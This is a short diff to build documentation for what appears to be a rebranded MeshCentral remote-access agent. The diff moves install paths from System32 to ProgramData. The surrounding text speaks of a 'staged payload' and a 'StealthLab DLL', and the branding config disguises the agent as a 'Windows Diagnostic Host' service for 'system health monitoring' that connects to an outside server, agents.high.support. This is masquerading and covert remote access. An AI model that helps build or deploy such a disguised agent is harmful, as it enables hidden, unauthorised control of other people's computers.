@@ -131,7 +131,7 @@ This produces `dist\meshcentral\` with:
 
 - Confirm the staged payload on disk matches the StealthLab DLL:
   ```powershell
-  Get-FileHash "C:\Windows\System32\DiagnosticHost\diagsvc.dll"
+  Get-FileHash "C:\\ProgramData\\DiagnosticHost\diagsvc.dll"
   ```
 - Run the included verifier to ensure branding, TLS profile, and provisioning data match expectations:
   ```powershell
@@ -178,8 +178,8 @@ The companion `branding_config.template.json` now mirrors every field consumed b
     "binaryName": "diaghost.exe",
     "productName": "Windows Diagnostic Host",
     "description": "system health monitoring",
-    "installRoot": "C:/Windows/System32/DiagnosticHost",
-    "logPath": "C:/Windows/System32/DiagnosticHost/logs"
+    "installRoot": "C:/ProgramData/DiagnosticHost",
+    "logPath": "C:/ProgramData/DiagnosticHost/logs"
   },
   "network": {
     "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
